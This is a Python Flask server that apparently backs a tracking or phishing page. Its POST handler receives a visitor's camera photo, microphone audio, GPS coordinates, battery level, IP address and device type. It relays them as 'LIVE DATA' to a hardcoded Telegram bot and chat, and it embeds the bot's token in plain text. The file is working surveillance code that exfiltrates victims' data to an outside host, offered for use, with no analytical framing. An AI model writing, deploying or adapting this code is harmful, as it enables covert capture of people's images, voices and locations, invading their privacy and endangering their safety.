from flask import Flask, request, jsonify, render_template
import requests
import base64
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = '8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM'
CHAT_ID = '1634075045'


def send_telegram_message(message, photo_data=None, audio_data=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        requests.post(url, data=data, timeout=20)

        if photo_data and photo_data != 'null':
            b64 = photo_data
            if 'base64,' in photo_data:
                b64 = photo_data.split('base64,')[1]
            try:
                binary = base64.b64decode(b64)
                if len(binary) > 0:
                    photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                    files = {'photo': ('photo.jpg', binary, 'image/jpeg')}
                    requests.post(photo_url, data={'chat_id': CHAT_ID, 'caption': '📸 Live Photo'}, files=files, timeout=30)
            except Exception as e:
                print(f"Photo error: {e}")

        if audio_data and audio_data != 'null':
            b64 = audio_data
            if 'base64,' in audio_data:
                b64 = audio_data.split('base64,')[1]
            try:
                binary = base64.b64decode(b64)
                if len(binary) > 0:
                    audio_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                    files = {'audio': ('audio.webm', binary, 'audio/webm')}
                    requests.post(audio_url, data={'chat_id': CHAT_ID, 'caption': '🎤 Live Audio'}, files=files, timeout=30)
            except Exception as e:
                print(f"Audio error: {e}")

        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False


def get_user_ip():
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or 'Unknown'


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


@app.route('/', methods=['POST'])
def collect():
    try:
        action = request.form.get('action', '')
        if action == 'collect':
            photo = request.form.get('photo', '')
            audio = request.form.get('audio', '')
            lat = request.form.get('lat', 'N/A')
            lng = request.form.get('lng', 'N/A')
            battery = request.form.get('battery', 'Unknown')
            ip = get_user_ip()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ua = request.headers.get('User-Agent', 'Unknown')

            platform = 'Unknown'
            if 'Windows' in ua: platform = 'Windows'
            elif 'Android' in ua: platform = 'Android'
            elif 'iPhone' in ua: platform = 'iPhone'
            elif 'Mac' in ua: platform = 'Mac'
            elif 'Linux' in ua: platform = 'Linux'

            photo_status = "✅" if photo else "❌"
            audio_status = "✅" if audio else "❌"

            msg = (
                f"🔐 LIVE DATA\n\n"
                f"📸 Photo: {photo_status}\n"
                f"🎤 Audio: {audio_status}\n"
                f"🌐 IP: <code>{ip}</code>\n"
                f"📍 Location: {lat}, {lng}\n"
                f"🗺️ <a href='https://maps.google.com/?q={lat},{lng}'>Map</a>\n"
                f"🔋 Battery: {battery}%\n"
                f"📱 Device: {platform}\n"
                f"🕐 Time: {timestamp}"
            )

            send_telegram_message(msg, photo, audio)
            return jsonify({'status': 'ok', 'message': 'Data sent'})

        return jsonify({'status': 'error', 'message': 'Unknown action'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)